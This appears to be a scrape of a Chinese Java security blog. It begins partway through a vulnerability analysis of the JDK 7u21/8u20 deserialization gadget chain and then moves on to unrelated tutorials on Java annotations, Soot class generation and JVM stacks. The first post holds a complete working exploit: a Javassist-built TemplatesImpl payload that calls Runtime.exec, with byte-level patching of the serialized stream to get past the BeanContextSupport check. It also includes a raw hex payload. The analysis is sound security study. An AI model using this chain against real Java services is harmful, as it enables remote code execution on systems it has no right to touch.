SC_SERIALIZABLE fieldCount - 1 - 0x00 01 Fields 0: Int - I - 0x49 fieldName Length - 4 - 0x00 04 Value - zero - 0x7a65726f classAnnotations TC_ENDBLOCKDATA - 0x78 superClassDesc TC_NULL - 0x70 newHandle 0x00 7e 00 01 classdata com.fxc.bautwentycase.AnnotationInvocationHandler values zero (int)0 - 0x00 00 00 00 B的序列化文件： 1234567891011121314151617181920STREAM_MAGIC - 0xac edSTREAM_VERSION - 0x00 05Contents TC_OBJECT - 0x73 TC_CLASSDESC - 0x72 className Length - 40 - 0x00 28 Value - com.fxc.bautwentycase.BeanContextSupport - 0x636f6d2e6678632e6261757477656e7479636173652e4265616e436f6e74657874537570706f7274 serialVersionUID - 0x00 00 00 00 00 00 00 14 newHandle 0x00 7e 00 00 classDescFlags - 0x02 - SC_SERIALIZABLE fieldCount - 0 - 0x00 00 classAnnotations TC_ENDBLOCKDATA - 0x78 superClassDesc TC_NULL - 0x70 newHandle 0x00 7e 00 01 classdata com.fxc.bautwentycase.BeanContextSupport values 再重复一遍：==A插入到B中== 插入到哪里？自然是objectAnnotation中了 前面我省略了，重点看插入后的classdata部分，最终版 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849STREAM_MAGIC - 0xac edSTREAM_VERSION - 0x00 05Contents TC_OBJECT - 0x73 TC_CLASSDESC - 0x72 className Length - 40 - 0x00 28 Value - com.fxc.bautwentycase.BeanContextSupport - 0x636f6d2e6678632e6261757477656e7479636173652e4265616e436f6e74657874537570706f7274 serialVersionUID - 0x00 00 00 00 00 00 00 14 newHandle 0x00 7e 00 00 //类对象 classDescFlags - 0x03 - SC_WRITE_METHOD | SC_SERIALIZABLE //修改 fieldCount - 0 - 0x00 00 classAnnotations TC_ENDBLOCKDATA - 0x78 superClassDesc TC_NULL - 0x70 newHandle 0x00 7e 00 01 // 实际对象 classdata com.panda.sec.BeanContextSupport values objectAnnotation // 从这里开始 TC_OBJECT - 0x73 TC_CLASSDESC - 0x72 className Length - 49 - 0x00 31 Value - com.fxc.bautwentycase.AnnotationInvocationHandler - 0x636f6d2e6678632e6261757477656e7479636173652e416e6e6f746174696f6e496e766f636174696f6e48616e646c6572 serialVersionUID - 0x00 00 00 00 00 00 00 0a newHandle 0x00 7e 00 02 // 记得按顺序修改 classDescFlags - 0x02 - SC_SERIALIZABLE fieldCount - 1 - 0x00 01 Fields 0: Int - I - 0x49 fieldName Length - 4 - 0x00 04 Value - zero - 0x7a65726f classAnnotations TC_ENDBLOCKDATA - 0x78 superClassDesc TC_NULL - 0x70 newHandle 0x00 7e 00 03 classdata com.fxc.bautwentycase.AnnotationInvocationHandler values zero (int)0 - 0x00 00 00 00 TC_ENDBLOCKDATA - 0x78 // 标志着对象结束 TC_REFERENCE - 0x71 Handle - 8257539 - 0x00 7e 00 03 //记得加最后一个句柄 8257539怎么来的？ 当然是逆SerializationDumper看源码抄的\\doge： 1234567891011121314public static void num()&#123; byte b1 = 0 ; byte b2 = 126; byte b3 = 0; byte b4 = 3; int handle = ( ((b1 &lt;&lt; 24) &amp; 0xff000000) + ((b2 &lt;&lt; 16) &amp; 0xff0000) + ((b3 &lt;&lt; 8) &amp; 0xff00) + ((b4 ) &amp; 0xff) ); System.out.println(\"Handle - \" + handle + \" - 0x\" + byteToHex(b1) + \" \" + byteToHex(b2) + \" \" + byteToHex(b3) + \" \" + byteToHex(b4)); &#125; 我们的payload梳理一下就是这个： 123456789aced 0005 7372 0028 636f 6d2e 6678 632e6261 7574 7765 6e74 7963 6173 652e 4265616e 436f 6e74 6578 7453 7570 706f 72740000 0000 0000 0014 0300 0078 7073 72003163 6f6d 2e66 7863 2e62 6175 7477 656e7479 6361 7365 2e41 6e6e 6f74 6174 696f6e49 6e76 6f63 6174 696f 6e48 616e 646c6572 0000 0000 0000 000a 0200 0149 00047a65 726f 7870 0000 0000 7871 007e 0003 攻击一下： 1234567891011public class Attack &#123; public static void main(String[] args) throws Exception&#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"payload\")); // 第一层 System.out.println(ois.readObject().toString()); AnnotationInvocationHandler a = (AnnotationInvocationHandler) ois.readObject(); // 第二层 System.out.println(a.toString()); a.exec(\"open /Applications/Calculator.app\"); &#125;&#125; 并且可以发现：[B(A)] 我们把A塞进了B之中，所以第一个反序列化出来的是B对象，第二个反序列化出来的是A对象。 绕过经过这篇的分析: 当我们序列化一个对象的时候，每次在写入序列化对象的时候，都会调用handles.lookup方法来判断该对象是否已经写入了，如果已经写入了，那么就会调用writeHandle(h)来写入引用类型标识和handle引用值0x7e0000+handle 在之前的7u21中 序列化顺序：HashSet.writeObject -&gt; AnnotationInvocationHandler.defaultWriteFields 反序列化顺序：HashSet.readObject -&gt; AnnotationInvocationHandler.readObject 但是在8u20中，AnnotationInvocationHandler.readObject限制了this.type必须是注解类型才可以。 如果不是的话，会抛出异常。 这个异常如果在反序列化过程当中被抛出，外层的HashSet也并没有catch处理，所以会报错。 所以我们需要找到一个类，除了最基本的序列化条件，还需要满足： 重写了readObject方法 在自身的readObject方法中，还存在readObject方法的调用，并且对第二次的readObject方法存在异常的catch。 JRE8u20 中利用到了名为 BeanContextSupport 类。 这个类满足以上条件，负责来帮我们绕过的。 看一下BeanContextSupport的readObject源码： 进入readChildren方法： 发现这里读去了流中的下一个对象，并且出现异常仅仅是catch，并没有throw，符合构造条件。 在执行ois.readObject()时,这里try-catch了,但是没有把异常抛出来,程序会接着执行。 如果这里可以把AnnotationInvocationHandler对象在BeanContextSupport类第二次writeObject的时候写入，这样反序列化时，即使AnnotationInvocationHandler对象 this.type的值为Templates类型也不会报错。 反序列化还有两点就是: 1.反序列化时类中没有这个成员，依然会对这个成员进行反序列化操作，但是之后会抛弃掉这个成员。 2.每一个新的对象都会分配一个newHandle的值，newHandle生成规则是从0x7e0000开始递增,如果后面出现相同的类型则会使用TC_REFERENCE结构，引用前面handle的值。 在之前的反序列化流程分析中我们知道： 在反序列化中，如果当前这个对象中的某个字段并没有在字节流中出现，则这些字段会使用类中定义的默认值，如果这个值出现在字节流中，但是并不属于对象，则抛弃该值，但是如果这个值是一个对象的话，那么会为这个值分配一个 Handle。 关联我们在7u21里面用的是LinkedHashSet作为反序列化的source类，我们现在希望有一个可以触发BeanContextSupport的readObject方法。 所以可以在LinkedHashSet内部生成一个BeanContextSupport类型的字段，这样就可以和7u21一样触发字段readObject方法了。 因为在反序列化流程中，都是先还原对象中字段的值，然后才是objectAnnotation的内容。所以放在这个场景里就是： 还原一个LinkedHashSet 还原这个LinkedHashSet中字段的值 如果这个LinkedHashSet中某一个字段是BeanContextSupport类型，那么就会触发BeanContextSupport.readObject 这个BeanContextSupport类型的字段本身还有一个字段是AnnotationInvocationHandler类型，所以就又会去触发AnnotationInvocationHandler.readObject 构造可以参考feihong师傅的payload，膜了膜了。 最终PoC最终payload： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202public class Exploit &#123; public static void main(String[] args) throws Exception &#123; //1.先创建恶意类 ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass tempExploitClass = pool.makeClass(\"3xpl01t\"); //一定要设置父类，为了后续顺利 tempExploitClass.setSuperclass(pool.get(AbstractTranslet.class.getName())); //写入payload，生成字节数组 String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"open /Applications/Calculator.app\\\");\"; tempExploitClass.makeClassInitializer().insertBefore(cmd); byte[] exploitBytes = tempExploitClass.toBytecode(); //2.new一个TemplatesImpl对象，修改tmpl类属性，为了满足后续利用条件 TemplatesImpl tmpl = new TemplatesImpl(); //设置_bytecodes属性为exploitBytes Field bytecodes = TemplatesImpl.class.getDeclaredField(\"_bytecodes\"); bytecodes.setAccessible(true); bytecodes.set(tmpl, new byte[][]&#123;exploitBytes&#125;); //一定要设置_name不为空 Field _name = TemplatesImpl.class.getDeclaredField(\"_name\"); _name.setAccessible(true); _name.set(tmpl, \"0range\"); //_class为空 Field _class = TemplatesImpl.class.getDeclaredField(\"_class\"); _class.setAccessible(true); _class.set(tmpl, null); //_auxClasses为空 Field _auxClasses = TemplatesImpl.class.getDeclaredField(\"_auxClasses\"); _auxClasses.setAccessible(true); _auxClasses.set(tmpl, null); //_auxClasses为空 Field _tfactory = TemplatesImpl.class.getDeclaredField(\"_tfactory\"); _tfactory.setAccessible(true); _tfactory.set(tmpl, TransformerFactoryImpl.class.newInstance()); //整个map,容量为2 Map map = new HashMap(2); String magicStr = \"f5a5a608\"; // 占位 map.put(magicStr, \"foo\"); Class clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class); cons.setAccessible(true); InvocationHandler invocationHandler = (InvocationHandler) cons.newInstance(Override.class, map); Field type = clazz.getDeclaredField(\"type\"); type.setAccessible(true); type.set(invocationHandler,Templates.class); Templates proxy = (Templates) Proxy.newProxyInstance(InvocationHandler.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, invocationHandler); //替换为真正的 map.put(magicStr, tmpl); LinkedHashSet set = new LinkedHashSet(); // 将serializable属性修改为0 为了进入readChildren方法 BeanContextSupport bcs = new BeanContextSupport(); Class cc = Class.forName(\"java.beans.beancontext.BeanContextSupport\"); Field serializable = cc.getDeclaredField(\"serializable\"); serializable.setAccessible(true); serializable.set(bcs, 0); //修改bcs父类的beanContextChildPeer属性设置为bcs自己 Field beanContextChildPeer = cc.getSuperclass().getDeclaredField(\"beanContextChildPeer\"); beanContextChildPeer.set(bcs, bcs); set.add(bcs); // 先加入BeanContextSupport bcs //开始写序列化 ByteArrayOutputStream baous = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baous); oos.writeObject(set); oos.writeObject(invocationHandler); oos.writeObject(tmpl); oos.writeObject(proxy); oos.close(); byte[] bytes = baous.toByteArray(); System.out.println(\"[+] Modify HashSet size from 1 to 3\"); bytes[89] = 3; //修改hashset的长度（元素个数） //调整 TC_ENDBLOCKDATA 标记的位置 //0x73 = 115, 0x78 = 120 //0x73 for TC_OBJECT, 0x78 for TC_ENDBLOCKDATA for(int i = 0; i &lt; bytes.length; i++)&#123; if(bytes[i] == 0 &amp;&amp; bytes[i+1] == 0 &amp;&amp; bytes[i+2] == 0 &amp; bytes[i+3] == 0 &amp;&amp; bytes[i+4] == 120 &amp;&amp; bytes[i+5] == 120 &amp;&amp; bytes[i+6] == 115)&#123; System.out.println(\"[+] Delete TC_ENDBLOCKDATA at the end of HashSet\"); bytes = Util.deleteAt(bytes, i + 5); break; &#125; &#125; //将 serializable 的值修改为 1 //0x73 = 115, 0x78 = 120 //0x73 for TC_OBJECT, 0x78 for TC_ENDBLOCKDATA for(int i = 0; i &lt; bytes.length; i++)&#123; if(bytes[i] == 120 &amp;&amp; bytes[i+1] == 0 &amp;&amp; bytes[i+2] == 1 &amp;&amp; bytes[i+3] == 0 &amp;&amp; bytes[i+4] == 0 &amp;&amp; bytes[i+5] == 0 &amp;&amp; bytes[i+6] == 0 &amp;&amp; bytes[i+7] == 115)&#123; System.out.println(\"[+] Modify BeanContextSupport.serializable from 0 to 1\"); bytes[i+6] = 1; break; &#125; &#125; /** TC_BLOCKDATA - 0x77 Length - 4 - 0x04 Contents - 0x00000000 TC_ENDBLOCKDATA - 0x78 **/ //把这部分内容先删除，再附加到 AnnotationInvocationHandler 之后 //目的是让 AnnotationInvocationHandler 变成 BeanContextSupport 的数据流 //0x77 = 119, 0x78 = 120 //0x77 for TC_BLOCKDATA, 0x78 for TC_ENDBLOCKDATA for(int i = 0; i &lt; bytes.length; i++)&#123; if(bytes[i] == 119 &amp;&amp; bytes[i+1] == 4 &amp;&amp; bytes[i+2] == 0 &amp;&amp; bytes[i+3] == 0 &amp;&amp; bytes[i+4] == 0 &amp;&amp; bytes[i+5] == 0 &amp;&amp; bytes[i+6] == 120)&#123; System.out.println(\"[+] Delete TC_BLOCKDATA...int...TC_BLOCKDATA at the End of BeanContextSupport\"); bytes = Util.deleteAt(bytes, i); bytes = Util.deleteAt(bytes, i); bytes = Util.deleteAt(bytes, i); bytes = Util.deleteAt(bytes, i); bytes = Util.deleteAt(bytes, i); bytes = Util.deleteAt(bytes, i); bytes = Util.deleteAt(bytes, i); break; &#125; &#125; /* serialVersionUID - 0x00 00 00 00 00 00 00 00 newHandle 0x00 7e 00 28 classDescFlags - 0x00 - fieldCount - 0 - 0x00 00 classAnnotations TC_ENDBLOCKDATA - 0x78 superClassDesc TC_NULL - 0x70 newHandle 0x00 7e 00 29 */ //0x78 = 120, 0x70 = 112 //0x78 for TC_ENDBLOCKDATA, 0x70 for TC_NULL for(int i = 0; i &lt; bytes.length; i++)&#123; if(bytes[i] == 0 &amp;&amp; bytes[i+1] == 0 &amp;&amp; bytes[i+2] == 0 &amp;&amp; bytes[i+3] == 0 &amp;&amp; bytes[i + 4] == 0 &amp;&amp; bytes[i+5] == 0 &amp;&amp; bytes[i+6] == 0 &amp;&amp; bytes[i+7] == 0 &amp;&amp; bytes[i+8] == 0 &amp;&amp; bytes[i+9] == 0 &amp;&amp; bytes[i+10] == 0 &amp;&amp; bytes[i+11] == 120 &amp;&amp; bytes[i+12] == 112)&#123; System.out.println(\"[+] Add back previous delte TC_BLOCKDATA...int...TC_BLOCKDATA after invocationHandler\"); i = i + 13; bytes = Util.addAtIndex(bytes, i++, (byte) 0x77); bytes = Util.addAtIndex(bytes, i++, (byte) 0x04); bytes = Util.addAtIndex(bytes, i++, (byte) 0x00); bytes = Util.addAtIndex(bytes, i++, (byte) 0x00); bytes = Util.addAtIndex(bytes, i++, (byte) 0x00); bytes = Util.addAtIndex(bytes, i++, (byte) 0x00); bytes = Util.addAtIndex(bytes, i++, (byte) 0x78); break; &#125; &#125; //将 sun.reflect.annotation.AnnotationInvocationHandler 的 classDescFlags 由 SC_SERIALIZABLE 修改为 SC_SERIALIZABLE | SC_WRITE_METHOD //这一步其实不是通过理论推算出来的，是通过debug 以及查看 pwntester的 poc 发现需要这么改 //原因是如果不设置 SC_WRITE_METHOD 标志的话 defaultDataEnd = true，导致 BeanContextSupport -&gt; deserialize(ois, bcmListeners = new ArrayList(1)) // -&gt; count = ois.readInt(); 报错，无法完成整个反序列化流程 // 没有 SC_WRITE_METHOD 标记，认为这个反序列流到此就结束了 // 标记： 7375 6e2e 7265 666c 6563 --&gt; sun.reflect... for(int i = 0; i &lt; bytes.length; i++)&#123; if(bytes[i] == 115 &amp;&amp; bytes[i+1] == 117 &amp;&amp; bytes[i+2] == 110 &amp;&amp; bytes[i+3] == 46 &amp;&amp; bytes[i + 4] == 114 &amp;&amp; bytes[i+5] == 101 &amp;&amp; bytes[i+6] == 102 &amp;&amp; bytes[i+7] == 108 )&#123; System.out.println(\"[+] Modify sun.reflect.annotation.AnnotationInvocationHandler -&gt; classDescFlags from SC_SERIALIZABLE to \" + \"SC_SERIALIZABLE | SC_WRITE_METHOD\"); i = i + 58; bytes[i] = 3; break; &#125; &#125; //加回之前删除的 TC_BLOCKDATA，表明 HashSet 到此结束 System.out.println(\"[+] Add TC_BLOCKDATA at end\"); bytes = Util.addAtLast(bytes, (byte) 0x78); //payload序列化写入文件，模拟网络传输 FileOutputStream fous = new FileOutputStream(System.getProperty(\"user.dir\")+\"/src/main/resources/Payload_jdk8u20.ser\"); fous.write(bytes); //服务端读取文件，反序列化，模拟网络传输 ObjectInputStream ois = new ObjectInputStream(new FileInputStream(System.getProperty(\"user.dir\")+\"/src/main/resources/Payload_jdk8u20.ser\")); //服务端反序列化，触发漏洞 ois.readObject(); ois.close(); &#125;&#125; 参考lalajun/高级利用/lazymap/浅析Java序列化和反序列化/ javassist/B4llo0n/anquanke/aliyun/平安/seebug wh1t3p1g/6&amp;7/b1ngz/7u21/8u20/序列化规范/8u20","categories":[{"name":"Java","slug":"Java","permalink":"https://0range228.github.io/categories/Java/"}],"tags":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://0range228.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"}]},{"title":"Java注解","slug":"Java注解","date":"2021-05-11T08:06:31.000Z","updated":"2021-05-11T08:07:18.176Z","comments":true,"path":"Java注解/","link":"","permalink":"https://0range228.github.io/Java%E6%B3%A8%E8%A7%A3/","excerpt":"序言 事不凝滞,理贵变通。 写框架离不开Java注解，今天来总结。","text":"序言 事不凝滞,理贵变通。 写框架离不开Java注解，今天来总结。 Java元注解 注解在Java语言中放在 { 类、方法、字段、参数 } 前的一个特殊的“注释”。 注解是一种用作标注的“元数据”。 四个：@Retention @Target @Docuement @Inherited @Retention：注解的保留位置 ​ @Retention(RetentionPolicy.SOURCE) //注解仅存在于源码中，在编译期就被丢掉了，不会被class包含。 ​ @Retention(RetentionPolicy.CLASS) // 不会加载进JVM，注解会在class字节码文件中存在，但运行时无法获得。 ​ @Retention(RetentionPolicy.RUNTIME) // 注解会在class字节码文件中存在，在运行时可以通过反射获取到。 这里如果@Retention未标注，默认是CLASS阶段。 通常我们自定义的都是RUNTIME阶段，一定要标注。 @Target：注解的作用目标 ​ @Target(ElementType.TYPE) //接口、类、枚举 ​ @Target(ElementType.FIELD) //字段、枚举的常量 ​ @Target(ElementType.METHOD) //方法 ​ @Target(ElementType.PARAMETER) //方法参数 ​ @Target(ElementType.CONSTRUCTOR) //构造函数 ​ @Target(ElementType.LOCAL_VARIABLE)//局部变量 ​ @Target(ElementType.ANNOTATION_TYPE)//注解 ​ @Target(ElementType.PACKAGE) ///包 @Document：说明该注解将被包含在javadoc中 @Inherited：说明子类可以继承父类中的该注解。 ​ @Inherited仅针对@Target(ElementType.TYPE)类型的注解有效，并且仅针对类的继承，对接口的继承无效。 Java注解的使用写个小demo： 12345678@Retention(RetentionPolicy.RUNTIME)@Target(ElementType.METHOD)public @interface Report &#123; boolean id() default false; int type() default 0; String level() default \"info\"; String value() default \"\";&#125; 本注解仅针对method，作用在runtime阶段。 使用该注解的方式应为： 12@Report(id=xxx,type=xxx,level=xxx,value=xxx)public void testMethod(...) default的意义在于如果使用注解的时候未给参数赋值，可以采用default预先写好的值。 如果注解想在多个target使用： 1234567891011@Retention(RetentionPolicy.RUNTIME)@Target(&#123; ElementType.METHOD, ElementType.TYPE&#125;)public @interface Report &#123; boolean id() default false; int type() default 0; String level() default \"info\"; String value() default \"\";&#125; 自定义注解必须要写： @Target @Retention 可定义多个参数和默认值，核心参数使用value名称。 应当设置@Retention(RetentionPolicy.RUNTIME)便于运行期读取该Annotation。 Java提供的使用反射API读取Annotation的方法包括： 判断某个注解是否存在于Class、Field、Method或Constructor： Class.isAnnotationPresent(Class) Field.isAnnotationPresent(Class) Method.isAnnotationPresent(Class) Constructor.isAnnotationPresent(Class) 例如： 12// 判断@Report是否存在于Person类:Person.class.isAnnotationPresent(Report.class); 使用反射API读取Annotation： Class.getAnnotation(Class) Field.getAnnotation(Class) Method.getAnnotation(Class) Constructor.getAnnotation(Class) 例如： 1234// 获取Person定义的@Report注解:Report report = Person.class.getAnnotation(Report.class);int type = report.type();String level = report.level(); demo: 123456@Retention(RetentionPolicy.RUNTIME)@Target(ElementType.FIELD)public @interface Range &#123; int min() default 0; int max() default 255;&#125; 某个JavaBean： 1234567public class Person &#123; @Range(min=1, max=20) public String name; @Range(max=10) public String city;&#125; 编写一个Person实例的检查方法，它可以检查Person实例的String字段长度是否满足@Range的定义： 1234567891011121314151617181920void check(Person person) throws Exception&#123; // 遍历所有Field: for (Field field : person.getClass().getFields()) &#123; // 获取Field定义的@Range: Range range = field.getAnnotation(Range.class); // 如果@Range存在: if (range != null) &#123; // 获取Field的值: Object value = field.get(person); // 如果值是String: if (value instanceof String) &#123; String s = (String) value; // 判断值是否满足@Range的min/max: if (s.length() &lt; range.min() || s.length() &gt; range.max()) &#123; throw new IllegalArgumentException(\"Invalid field: \" + field.getName()); &#125; &#125; &#125; &#125;&#125; 参考： liaoxuefeng 竹子","categories":[{"name":"Java","slug":"Java","permalink":"https://0range228.github.io/categories/Java/"}],"tags":[{"name":"Java基础","slug":"Java基础","permalink":"https://0range228.github.io/tags/Java%E5%9F%BA%E7%A1%80/"}]},{"title":"使用soot创建类文件","slug":"使用soot创建类文件","date":"2021-03-25T02:19:08.000Z","updated":"2021-03-25T02:26:43.635Z","comments":true,"path":"使用soot创建类文件/","link":"","permalink":"https://0range228.github.io/%E4%BD%BF%E7%94%A8soot%E5%88%9B%E5%BB%BA%E7%B1%BB%E6%96%87%E4%BB%B6/","excerpt":"序言 鱼沉雁杳天涯路，始信人间别离苦。 老博客归档。","text":"序言 鱼沉雁杳天涯路，始信人间别离苦。 老博客归档。 如何创建一个类之前看ASM创建一个类，很实费劲，需要直接写字节码口令，这次尝试用Soot API写一下最简单的Hello World。 加载java.lang.Object和库类我们知道所有对象的父类都是Object类，那么上来第一步，先添加两个依赖类： 123//创建两个依赖类 Scene.v().loadClassAndSupport(\"java.lang.Object\"); Scene.v().loadClassAndSupport(\"java.lang.System\"); 这里，教程上说，当你loadClassAndSupport时候，相关类的所有内容都会被加载进来，一招拿下！ 创建一个新SootClass对象接下来创建我们创建的这个类就叫做HelloWorld。在Soot里面需要用SootClass来封装，并将其父类设置为java.lang.Object。 1sClass = new SootClass(\"HelloWorld\", Modifier.PUBLIC); 1sClass.setSuperclass(Scene.v().getSootClass(\"java.lang.Object\")); 这会将新创建的类的父类设置为的SootClass对象java.lang.Object。注意使用工具的方法getSootClass上Scene。 1Scene.v().addClass(sClass); 这会将新创建的HelloWorld类添加到中Scene。Scene一旦创建，所有类都应该属于它们。 向SootClass添加方法想向Soot类添加一个sout方法，打印helloworld，首先需要main方法。 目前Helloworld类的main()方法还是空的。 现在有了SootClass，我们需要向其中添加方法。 123method = new SootMethod(\"main\", Arrays.asList(new Type[] &#123;ArrayType.v(RefType.v(\"java.lang.String\"), 1)&#125;), VoidType.v(), Modifier.PUBLIC | Modifier.STATIC); 解读： 在这里需要首先写出一个main方法，他是public&amp;static的，并且main方法接受一个java.lang.String的参数数组，并且返回void。 SootClass： 每个SootClass代表一个Java对象，我们可以实例化该类，也可以为它指定类型。 如果想要获得java.lang.String的类型，我们可以用RefType.v(&quot;java.lang.String&quot;)。 如果现在已经有了一个SootClass对象sc，我们可以用sc.getType()获取对应的类型。 1sClass.addMethod(method); 此代码将main方法添加到其所属类，也就是sClass。 向方法添加代码如果方法不包含任何代码，则它是无用的。我们继续向该main方法添加一些代码。为此，我们必须为代码选择一个中间表示形式。 创建JimpleBodyJimple是soot四个中间表示形式之一，也是最受欢迎的。 在Soot中，通常这一步是将一个Body附加在SootMethod对象上，也就是附加到之前我们声明的method对象上。 每个Body知道自己属于哪个SootMethod，但是每个SootMethod每次只能有一个activeBody： 1SootMethod.getActiveBody() 更准确滴说，每个Body有三个特征组件： Local Body体内的局部变量； Trap 哪些代码用来捕获哪些异常； Unit Unit表示语句本身； 所以接下来，我们需要给main方法添加一个Jimple主体，再像主体添加代码语句； 12JimpleBody body = Jimple.v().newBody(method);method.setActiveBody(body); 我们将Jimple单例对象称为JimpleBody与我们的方法相关联的新对象，并使它成为方法的活动主体。 这里先看一下Jimple中间代码： 接下来下面就需要按照目标Jimple一步步来做。 添加本地变量添加本地变量需要用到arg，所以直接写； 12arg = Jimple.v().newLocal(\"l0\", ArrayType.v(RefType.v(\"java.lang.String\"), 1));body.getLocals().add(arg); 这里是为啥呢，我的理解； 对于sout(“Helloworld!”)来说，我们需要有一个字符串变量，最后打印的也是他，不难理解； 这里局部变量还有一个就是打印对象，在Java里面，所有东西都是对象； 这里第二个就是java.io.PrintStream对象，打印流对象； 123//加入局部变量，java.io.PrintStream tmpReftmpRef = Jimple.v().newLocal(\"tmpRef\", RefType.v(\"java.io.PrintStream\"));body.getLocals().add(tmpRef); 添加方法代码添加方法就需要unit了，直接写： 1234//组成链，l0 = @parameter0 units.add(Jimple.v().newIdentityStmt(arg, Jimple.v().newParameterRef(ArrayType.v (RefType.v(\"java.lang.String\"), 1), 0))); 理解： 就在上面一步，arg是我们的字符串变量，交给JVM时候，他就是字符串变量l0。 继续写： 123//继续组成链，tmpRef = java.lang.System.out units.add(Jimple.v().newAssignStmt(tmpRef, Jimple.v().newStaticFieldRef( Scene.v().getField(\"&lt;java.lang.System: java.io.PrintStream out&gt;\").makeRef()))); 理解： 这里其实就是把上面的tmpRef给到System.out对象，这里仍有存疑，之后会慢慢看。 最后一步，赋值： 12345// insert \"tmpRef.println(\"Hello world!\")\" &#123; SootMethod toCall = Scene.v().getMethod(\"&lt;java.io.PrintStream: void println(java.lang.String)&gt;\"); units.add(Jimple.v().newInvokeStmt(Jimple.v().newVirtualInvokeExpr(tmpRef, toCall.makeRef(), StringConstant.v(\"Hello world!\")))); &#125; 我们获得带有签名的方法&lt;java.io.PrintStream: void println(java.lang.String)&gt;（该方法名为println，属于PrintStream，返回void并采用一个 String作为其参数-这足以唯一地标识该方法），并使用StringConstant“ Hello world！”调用它。 写到类文件里面将程序编写为.class文件的首选方法是使用ASM后端。 123456int java_version = Options.v().java_version();String fileName = SourceLocator.v().getFileNameFor(sClass, Options.output_format_class);OutputStream streamOut = new FileOutputStream(fileName);BafASMBackend backend = new BafASMBackend(sClass, java_version);backend.generateClassFile(streamOut);streamOut.close(); 也可以使用过时的Jasmin后端。我们首先构造输出流，该流将使用Jasmin源并输出.class文件。我们可以手动指定文件名，也可以让Soot确定正确的文件名。我们在这里做后者。 1234567String fileName = SourceLocator.v().getFileNameFor(sClass, Options.output_format_class);OutputStream streamOut = new JasminOutputStream(new FileOutputStream(fileName));PrintWriter writerOut = new PrintWriter(new OutputStreamWriter(streamOut));JasminClass jasminClass = new soot.jimple.JasminClass(sClass);jasminClass.print(writerOut);writerOut.flush();streamOut.close(); 如果我们希望输出简单的源代码而不是.class文件，则可以使用以下代码： 123456String fileName = SourceLocator.v().getFileNameFor(sClass, Options.output_format_jimple);OutputStream streamOut = new FileOutputStream(fileName);PrintWriter writerOut = new PrintWriter(new OutputStreamWriter(streamOut));Printer.v().printTo(sClass, writerOut);writerOut.flush();streamOut.close(); 我们省略了JasminOutputStream，并在上调用printTo方法Printer。 结果 源代码环节1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162public class Test &#123; public static void main(String[] args) throws IOException &#123; //创建两个依赖类 Scene.v().loadClassAndSupport(\"java.lang.Object\"); Scene.v().loadClassAndSupport(\"java.lang.System\"); //声明目标类HelloWorld，他的父类当然是Object SootClass sClass = new SootClass(\"HelloWorld\", Modifier.PUBLIC); sClass.setSuperclass(Scene.v().getSootClass(\"java.lang.Object\")); Scene.v().addClass(sClass); //创建main方法，public static void main SootMethod method = new SootMethod(\"main\", Arrays.asList(new Type[]&#123;ArrayType.v(RefType.v(\"java.lang.String\"), 1)&#125;), VoidType.v(), Modifier.PUBLIC | Modifier.STATIC); sClass.addMethod(method); //创建main方法内容，这里需要用到Jimple &#123; JimpleBody body = Jimple.v().newBody(method); method.setActiveBody(body); //工具组件 Chain units = body.getUnits(); Local arg,tmpRef; //加入局部变量，java.lang.String l0 arg = Jimple.v().newLocal(\"l0\", ArrayType.v(RefType.v(\"java.lang.String\"), 1)); body.getLocals().add(arg); //加入局部变量，java.io.PrintStream tmpRef tmpRef = Jimple.v().newLocal(\"tmpRef\", RefType.v(\"java.io.PrintStream\")); body.getLocals().add(tmpRef); //组成链，l0 = @parameter0 units.add(Jimple.v().newIdentityStmt(arg, Jimple.v().newParameterRef(ArrayType.v (RefType.v(\"java.lang.String\"), 1), 0))); //继续组成链，tmpRef = java.lang.System.out units.add(Jimple.v().newAssignStmt(tmpRef, Jimple.v().newStaticFieldRef( Scene.v().getField(\"&lt;java.lang.System: java.io.PrintStream out&gt;\").makeRef()))); // insert \"tmpRef.println(\"Hello world!\")\" &#123; SootMethod toCall = Scene.v().getMethod(\"&lt;java.io.PrintStream: void println(java.lang.String)&gt;\"); units.add(Jimple.v().newInvokeStmt(Jimple.v().newVirtualInvokeExpr(tmpRef, toCall.makeRef(), StringConstant.v(\"Hello world!\")))); &#125; // insert \"return\" units.add(Jimple.v().newReturnVoidStmt()); &#125; String fileName = SourceLocator.v().getFileNameFor(sClass, Options.output_format_class); OutputStream streamOut = new JasminOutputStream(new FileOutputStream(fileName)); PrintWriter writerOut = new PrintWriter(new OutputStreamWriter(streamOut)); JasminClass jasminClass = new soot.jimple.JasminClass(sClass); jasminClass.print(writerOut); writerOut.flush(); streamOut.close(); &#125;&#125; #","categories":[{"name":"Java","slug":"Java","permalink":"https://0range228.github.io/categories/Java/"}],"tags":[{"name":"Soot","slug":"Soot","permalink":"https://0range228.github.io/tags/Soot/"}]},{"title":"JVM操作数栈与局部变量表","slug":"JVM操作数栈与局部变量表","date":"2021-03-17T08:47:58.000Z","updated":"2021-05-18T03:52:51.918Z","comments":true,"path":"JVM操作数栈与局部变量表/","link":"","permalink":"https://0range228.github.io/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/","excerpt":"序言 知人者智，自知者明。 最近在看Java污点分析，逃不开对象.方法调用形式，做个记录，随时更新。","text":"序言 知人者智，自知者明。 最近在看Java污点分析，逃不开对象.方法调用形式，做个记录，随时更新。 温故动态语言与静态语言 对类型的检查，在编译期就是静态语言，在运行期就是动态语言； 静态语言是判断变量自身的类型信息，动态语言是判断变量值的类型信息 